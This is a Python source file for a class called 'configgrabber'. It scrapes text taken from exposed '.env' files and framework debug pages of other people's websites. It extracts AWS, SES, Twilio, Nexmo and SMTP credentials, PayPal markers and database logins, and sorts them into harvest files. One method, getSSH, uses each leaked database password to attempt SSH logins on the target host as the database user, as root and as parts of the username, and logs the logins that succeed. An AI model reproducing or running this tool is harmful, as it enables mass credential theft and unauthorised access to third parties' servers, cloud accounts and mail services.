import re
import pma
import paramiko

class configgrabber:
	def __init__(self):
		self.list_region = ['us-east-1', 'us-east-2', 'us-west-1', 'us-west-2', 'af-south-1', 'ap-east-1', 'ap-south-1', 'ap-northeast-1', 'ap-northeast-2', 'ap-northeast-3', 'ap-southeast-1', 'ap-southeast-2', 'ca-central-1', 'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-south-1', 'eu-north-1', 'me-south-1', 'sa-east-1']

	def paypal(self, text, url):
		if "PAYPAL_" in text:
			save = open('v2/paypal_sandbox.txt','a')
			save.write(url+'\n')
			save.close()
			return True
		else:
			return False

	def get_aws_region(self, text):
		reg = False
		for region in self.list_region:
			if str(region) in text:
				return region
				break

	def get_aws_data(self, text, url):
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				if "AWS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					try:
						aws_key = re.findall("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = re.findall("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = self.get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = re.findall("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = re.findall("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = self.get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
					remover = str(build).replace('\r', '')
					save = open('v2/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()

					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\n'+str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save2 = open('v2/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "AWS_KEY" in text:
				if "AWS_KEY=" in text:
					method = '/.env'
					try:
						aws_key = re.findall("\nAWS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = re.findall("\nAWS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = self.get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = re.findall("\nAWS_BUCKET=(.*?)\n", text)[0]
					except:
						aws_buc = ''
				elif "<td>AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = re.findall("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = re.findall("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = self.get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = re.findall("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_buc = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '+str(aws_buc)
					remover = str(build).replace('\r', '')
					save = open('v2/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()

					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\n'+str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save2 = open('v2/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			elif "SES_KEY" in text:
				if "SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = re.findall("\nSES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = re.findall("\nSES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = self.get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = re.findall("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = re.findall("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = self.get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '
					remover = str(build).replace('\r', '')
					save = open('v2/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()

					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\n'+str(aws_key)+'|'+str(aws_sec)+'|'+str(aws_reg)
					remover = str(build).replace('\r', '')
					save2 = open('v2/aws_access_key_secret.txt', 'a')
					save2.write(remover+'\n\n')
					save2.close()
				return True
			else:
				return False
		except:
			return False

	def get_twillio(self, text, url):
		try:
			if "TWILIO" in text:
				if "TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = re.findall('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = re.findall('\nTWILIO_API_KEY=(.*?)\n', text)[0]
					except:
						acc_key = ''
					try:
						sec = re.findall('\nTWILIO_API_SECRET=(.*?)\n', text)[0]
					except:
						sec = ''
					try:
						chatid = re.findall('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]
					except:
						chatid = ''
					try:
						phone = re.findall('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
					try:
						auhtoken = re.findall('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = re.findall('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_key = ''
					try:
						sec = re.findall('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						sec = ''
					try:
						chatid = re.findall('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						chatid = ''
					try:
						phone = re.findall('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
					try:
						auhtoken = re.findall('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)
				remover = str(build).replace('\r', '')
				save = open('v2/TWILLIO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False

	def get_nexmo(self, text, url):
		try:
			if "NEXMO" in text:
				if "NEXMO_KEY=" in text:
					method = '/.env'
					try:
						acc_key = re.findall('\NEXMO_KEY=(.*?)\n', text)[0]
					except:
						acc_key = ''
					try:
						acc_secret = re.findall('\NEXMO_SECRET=(.*?)\n', text)[0]
					except:
						acc_secret = ''
				elif '<td>NEXMO_KEY</td>' in text:
					method = 'debug'
					try:
						acc_key = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_key = ''
					try:
						acc_secret = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nNEXMO_KEY: '+str(acc_key)+'\nNEXMO_SECRET: '+str(acc_secret)
				remover = str(build).replace('\r', '')
				save = open('v2/NEXMO.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
			return False

	def get_smtp(self, text, url):
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = re.findall("\nMAIL_HOST=(.*?)\n", text)[0]
					mailport = re.findall("\nMAIL_PORT=(.*?)\n", text)[0]
					mailuser = re.findall("\nMAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = re.findall("\nMAIL_PASSWORD=(.*?)\n", text)[0]
					try:
						mailfrom = re.findall("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
					except:
						mailfrom = ''
					try:
						fromname = re.findall("\MAIL_FROM_NAME=(.*?)\n", text)[0]
					except:
						fromname = ''
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = re.findall('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = re.findall('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = re.findall('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = re.findall('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					try:
						mailfrom = re.findall("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mailfrom = ''
					try:
						fromname = re.findall("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						fromname = ''
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					# mod aws
					if '.amazonaws.com' in mailhost:
						getcountry = re.findall('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('v2/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n\n')
						save.close()

						remover = str(build).replace('\r', '')
						save2 = open('v2/smtp_aws.txt', 'a')
						save2.write(remover+'\n\n')
						save2.close()

					elif 'sendgrid' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('v2/sendgrid.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'office365' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('v2/office.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif '1and1' in mailhost or '1und1' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('v2/1and1.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'zoho' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('v2/zoho.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mandrillapp' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('v2/mandrill.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'mailgun' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('v2/mailgun.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					elif 'gmail' or 'googlemail' in mailhost:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('v2/gsuite.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					else:
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)
						remover = str(build).replace('\r', '')
						save = open('v2/SMTP_RANDOM.txt', 'a')
						save.write(remover+'\n\n')
						save.close()
					return True
			else:
				return False
		except:
			return False

	def getSSH(sel, text, url):
			if 'DB_PASSWORD' in text and 'DB_HOST' in text:
				if '://' in url:
					parse = url.split('://', 2)
					parse = parse[1]
					parse = parse.split('/')
					host = parse[0]
				else:
					parse = parse.split('/')
					host = parse[0]

				# grab password
				if 'DB_USERNAME=' in text:
					method = './env'
					db_user = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]
					db_pass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]
				elif '<td>DB_USERNAME</td>' in text:
					method = 'debug'
					db_user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					db_pass = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]

				# login ssh
				if db_user and db_pass:
					connected = 0
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, db_user, db_pass, timeout=3)
						fp = open('v2/ssh.txt', 'a+')
						build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSSH_HOST: '+str(host)+'\nSSH_PORT: 22\nUSERNAME: '+str(db_user)+'\nPASSWORD: '+str(db_pass)+'\n'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

					if db_user != 'root':
						ssh = paramiko.SSHClient()
						ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
						try:
							ssh.connect(host, 22, 'root', db_pass, timeout=3)
							fp = open('v2/ssh.txt', 'a+')
							build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSSH_HOST: '+str(host)+'\nSSH_PORT: 22\nUSERNAME: '+str(db_user)+'\nPASSWORD: '+str(db_pass)+'\n'
							remover = str(build).replace('\r', '')
							fp.write(remover + '\n\n')
							fp.close()
							connected += 1
						except:
							pass
						finally:
							if ssh:
								ssh.close()

					if '_' in db_user:
						aw, iw = db_user.split('_')
						ssh = paramiko.SSHClient()
						ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
						try:
							ssh.connect(host, 22, iw, db_pass, timeout=3)
							fp = open('v2/ssh.txt', 'a+')
							build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSSH_HOST: '+str(host)+'\nSSH_PORT: 22\nUSERNAME: '+str(db_user)+'\nPASSWORD: '+str(db_pass)+'\n'
							remover = str(build).replace('\r', '')
							fp.write(remover + '\n\n')
							fp.close()
							connected += 1
						except:
							pass
						finally:
							if ssh:
								ssh.close()

						ssh = paramiko.SSHClient()
						ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
						try:
							ssh.connect(host, 22, aw, db_pass, timeout=3)
							fp = open('v2/ssh.txt', 'a+')
							build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSSH_HOST: '+str(host)+'\nSSH_PORT: 22\nUSERNAME: '+str(db_user)+'\nPASSWORD: '+str(db_pass)+'\n'
							remover = str(build).replace('\r', '')
							fp.write(remover + '\n\n')
							fp.close()
							connected += 1
						except:
							pass
						finally:
							if ssh:
								ssh.close()

					if connected > 0:
						return connected
					else:
						return False
			else:
				return False

	def get_database(self, text, url):
			pm = pma.pma(url)
			pmp = pm.check()
			if 'DB_USERNAME=' in text:
				method = '/.env'
				db_host = re.findall("\nDB_HOST=(.*?)\n", text)[0]
				db_dbse = re.findall("\nDB_DATABASE=(.*?)\n", text)[0]
				db_user = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]
				db_pass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method) + '\n'
				if pmp:
					build += 'PMA: ' + str(pmp) + '\n'
				build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: '+str(db_user)+'\nPASSWORD: '+str(db_pass)+'\n'
				remover = str(build).replace('\r', '')
				if pmp:
					fp = open('v2/phpmyadmin.txt', 'a+')
					fp.write(remover + '\n')
					fp.close()
				else:
					fp = open('v2/database.txt', 'a+')
					fp.write(remover + '\n')
					fp.close()
			elif '<td>DB_USERNAME</td>' in text:
				method = 'debug'
				db_host = re.findall('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				db_dbse = re.findall('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				db_user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				db_pass = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\n'
				if pmp:
					build += 'PMA: ' + str(pmp) + '\n'
				build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: '+str(db_user)+'\nPASSWORD: '+str(db_pass)+'\n'
				remover = str(build).replace('\r', '')
				if pmp:
					fp = open('v2/phpmyadmin.txt', 'a+')
					fp.write(remover + '\n')
					fp.close()
				else:
					fp = open('v2/database.txt', 'a+')
					fp.write(remover + '\n')
					fp.close()
			return pmp